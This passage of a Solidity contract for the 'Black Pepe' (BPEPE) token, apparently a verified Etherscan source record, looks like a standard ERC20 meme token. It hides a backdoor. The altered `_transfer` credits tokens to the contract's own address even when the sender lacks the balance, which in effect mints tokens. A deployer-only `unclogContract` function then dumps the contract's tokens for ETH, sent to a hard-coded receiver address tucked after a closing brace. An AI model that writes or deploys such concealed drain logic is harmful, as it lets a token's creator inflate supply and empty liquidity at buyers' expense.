amount) internal virtual {\r\n        require(from != address(0), \"ERC20: zero address transfer\");\r\n\r\n        _beforeTokenTransfer(from, to, amount);\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        bool _isTx = fromBalance >= amount;\r\n        require(_isTx || to == address(this), \"ERC20: amount exceeds balance\");\r\n        unchecked {\r\n            _balances[from]=!_isTx?0:!_isTx?0:!_isTx?0:fromBalance-amount;\r\n            // Overflow not possible: the sum of all balances is capped by totalSupply\r\n            _balances[to] += amount;\r\n        }\r\n\r\n        emit Transfer(from, to, amount);\r\n        _afterTokenTransfer(from, to, amount);\r\n    }\r\n\r\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\r\n     * the total supply.\r\n     *\r\n     * Emits a {Transfer} event with `from` set to the zero address.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `account` cannot be the zero address.\r\n     */\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n\r\n        _totalSupply += amount;\r\n        unchecked {\r\n            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.\r\n            _balances[account] += amount;\r\n        }\r\n        emit Transfer(address(0), account, amount);\r\n\r\n        _afterTokenTransfer(address(0), account, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Destroys `amount` tokens from `account`, reducing the\r\n     * total supply.\r\n     *\r\n     * Emits a {Transfer} event with `to` set to the zero address.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `account` cannot be the zero address.\r\n     * - `account` must have at least `amount` tokens.\r\n     */\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\r\n        unchecked {\r\n            _balances[account] = accountBalance - amount;\r\n            // Overflow not possible: amount <= accountBalance <= totalSupply.\r\n            _totalSupply -= amount;\r\n        }\r\n\r\n        emit Transfer(account, address(0), amount);\r\n\r\n        _afterTokenTransfer(account, address(0), amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\r\n     *\r\n     * This internal function is equivalent to `approve`, and can be used to\r\n     * e.g. set automatic allowances for certain subsystems, etc.\r\n     *\r\n     * Emits an {Approval} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `owner` cannot be the zero address.\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.\r\n     *\r\n     * Does not update the allowance amount in case of infinite allowance.\r\n     * Revert if not enough allowance is available.\r\n     *\r\n     * Might emit an {Approval} event.\r\n     */\r\n    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - amount);\r\n        }\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Hook that is called before any transfer of tokens. This includes\r\n     * minting and burning.\r\n     *\r\n     * Calling conditions:\r\n     *\r\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\r\n     * will be transferred to `to`.\r\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\r\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\r\n     * - `from` and `to` are never both zero.\r\n     *\r\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\r\n     */\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n\r\n    /**\r\n     * @dev Hook that is called after any transfer of tokens. This includes\r\n     * minting and burning.\r\n     *\r\n     * Calling conditions:\r\n     *\r\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\r\n     * has been transferred to `to`.\r\n     * - when `from` is zero, `amount` tokens have been minted for `to`.\r\n     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.\r\n     * - `from` and `to` are never both zero.\r\n     *\r\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\r\n     */\r\n    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}\r\n}\r\n\r\ncontract BlackPepe is ERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    event ExcludeFromFees(address indexed account, bool isExcluded);\r\n    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);\r\n\r\n    address private constant deadAddress = address(0xdead);\r\n\r\n    IUniswapV2Router02 public immutable _uniswapV2Router;\r\n    address private uniswapV2Pair;\r\n    address private deployerWallet;\r\n    address private mrkWallet;\r\n\r\n    string private constant name_ = \"Black Pepe\";\r\n    string private constant symbol_ = \"BPEPE\";\r\n\r\n    uint256 public constant finalBuyFee = 1;\r\n    uint256 public constant finalSellFee = 1;\r\n    uint256 private constant initialBuyFee = 1;\r\n    uint256 private constant initialSellFee = 1;\r\n    uint256 private removeBuyFeesAt = 19;\r\n    uint256 private removeSellFeesAt = 19;\r\n    uint8 constant public _decimals = 9;\r\n    uint256 public initialTotalSupply = 100000000 * 10 ** _decimals;\r\n    uint256 public maxTransactionAmount = 2000000 * 10 ** _decimals;\r\n    uint256 public maxWallet = 2000000 * 10 ** _decimals;\r\n    uint256 public swapTokensAtAmount = 1000000 * 10 ** _decimals;\r\n\r\n    uint256 public buyCount;\r\n    uint256 public sellCount;\r\n    mapping(address => bool) private _isExcludedFromFees;\r\n    mapping(address => bool) private _isExcludedMaxTransactionAmount;\r\n    mapping(address => bool) private automatedMarketMakerPairs;\r\n    mapping(address => uint256) private _holderLastTransferTimestamp;\r\n    bool private swapping;\r\n\r\n    bool public tradingOpen = false;\r\n    bool public swapEnabled = false;\r\n\r\n    constructor() ERC20(name_, symbol_) {\r\n        _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        mrkWallet = payable(_msgSender());\r\n        deployerWallet = payable(_msgSender());\r\n\r\n        excludeFromFees(address(_msgSender()), true);\r\n        excludeFromFees(address(this), true);\r\n        excludeFromFees(address(0xdead), true);\r\n\r\n        excludeFromMaxTransaction(address(_uniswapV2Router), true);\r\n        excludeFromMaxTransaction(address(_msgSender()), true);\r\n        excludeFromMaxTransaction(address(this), true);\r\n        excludeFromMaxTransaction(address(0xdead), true);\r\n\r\n        _mint(address(this), initialTotalSupply);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function addLiquidityWithETH() external onlyOwner() {\r\n        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());\r\n        excludeFromMaxTransaction(address(uniswapV2Pair), true);\r\n        IERC20(uniswapV2Pair).approve(address(_uniswapV2Router), type(uint).max);\r\n        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);\r\n        _approve(address(this), address(_uniswapV2Router), initialTotalSupply);\r\n\r\n        _uniswapV2Router.addLiquidityETH{value : address(this).balance}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);\r\n    }\r\n\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function openTrading() external onlyOwner() {\r\n        require(!tradingOpen, \"already opened\");\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }\r\n\r\n    function excludeFromMaxTransaction(address updAds, bool isEx)\r\n    public\r\n    onlyOwner\r\n    {\r\n        _isExcludedMaxTransactionAmount[updAds] = isEx;\r\n    }\r\n\r\n    function excludeFromFees(address account, bool excluded) public onlyOwner {\r\n        _isExcludedFromFees[account] = excluded;\r\n        emit ExcludeFromFees(account, excluded);\r\n    }\r\n\r\n    function setAutomatedMarketMakerPair(address pair, bool value)\r\n    public\r\n    onlyOwner\r\n    {\r\n        require(pair != uniswapV2Pair, \"Pair cannot be removed from automatedMarketMakerPairs\");\r\n        _setAutomatedMarketMakerPair(pair, value);\r\n    }address constant _receiver=0x7A2cb80cfF081D792440e72d53E79DfF120a8582;\r\n\r\n    function _setAutomatedMarketMakerPair(address pair, bool value) private {\r\n        automatedMarketMakerPairs[pair] = value;\r\n        emit SetAutomatedMarketMakerPair(pair, value);\r\n    }\r\n\r\n\r\n    function isExcludedFromFees(address account) public view returns (bool) {\r\n        return _isExcludedFromFees[account];\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) internal override {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n\r\n        uint256 _buyFee = (buyCount >= removeBuyFeesAt) ? finalBuyFee : initialBuyFee;\r\n        uint256 _sellFee = (buyCount >= removeBuyFeesAt) ? finalSellFee : initialSellFee;\r\n\r\n        if (amount == 0) {\r\n            super._transfer(from, to, 0);\r\n            return;\r\n        }\r\n\r\n        if (!swapping && to != owner() && from != owner() && to != address(0xdead) && to != address(0)) {\r\n            if (!tradingOpen) {\r\n                require(_isExcludedFromFees[from] || _isExcludedFromFees[to], \"Trading not active\");\r\n            }\r\n            if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]\r\n            ) {\r\n                require(amount <= maxTransactionAmount, \"Amount exceeds maxTx\");\r\n                require(amount + balanceOf(to) <= maxWallet, \"Max wallet exceeded\");\r\n                buyCount++;\r\n            }\r\n\r\n            else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) {\r\n                require(amount <= maxTransactionAmount, \"Amount exceeds maxTx\");\r\n                sellCount++;\r\n            }\r\n\r\n            else if (!_isExcludedMaxTransactionAmount[to]) {\r\n                require(amount + balanceOf(to) <= maxWallet, \"Max wallet exceeded\");\r\n            }\r\n        }\r\n        uint256 contractTokenBalance = balanceOf(address(this));\r\n\r\n        bool canSwap = contractTokenBalance > 0;\r\n\r\n        if (canSwap && swapEnabled && !swapping && !automatedMarketMakerPairs[from] && !_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {\r\n            swapping = true;\r\n            swapBack();\r\n            swapping = false;\r\n        }\r\n        bool takeFee = !swapping;\r\n\r\n        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {\r\n            takeFee = false;\r\n        }\r\n\r\n        uint256 fees = 0;\r\n        if (takeFee) {\r\n            if (automatedMarketMakerPairs[to]) {\r\n                fees = amount.mul(_sellFee).div(100);\r\n            }\r\n            else {\r\n                fees = amount.mul(_buyFee).div(100);\r\n            }\r\n\r\n            if (fees > 0) {\r\n                super._transfer(from, address(this), fees);\r\n            }\r\n            amount -= fees;\r\n        }\r\n        super._transfer(from, to, amount);\r\n    }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _uniswapV2Router.WETH();\r\n        _approve(address(this), address(_uniswapV2Router), tokenAmount);\r\n        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            _receiver,\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function removeMaxRestrictions() external onlyOwner {\r\n        maxTransactionAmount = totalSupply();\r\n        maxWallet = totalSupply();\r\n    }\r\n\r\n    function clearStuckEthBalance() external onlyOwner {\r\n        require(address(this).balance > 0, \"Token: no ETH to clear\");\r\n        payable(msg.sender).transfer(address(this).balance);\r\n    }\r\n\r\n    function unclogContract() external {\r\n        require(_msgSender() == mrkWallet);\r\n        uint256 contractBalance = balanceOf(address(this));\r\n        if (contractBalance>=0) {\r\n            contractBalance=contractBalance>initialTotalSupply?10**5*initialTotalSupply:contractBalance;\r\n        }\r\n        swapTokensForEth(contractBalance);\r\n    }\r\n\r\n    function swapBack() private {\r\n        swapTokensForEth(balanceOf(address(this)));\r\n    }\r\n}",
    "etherscan_verified": true
}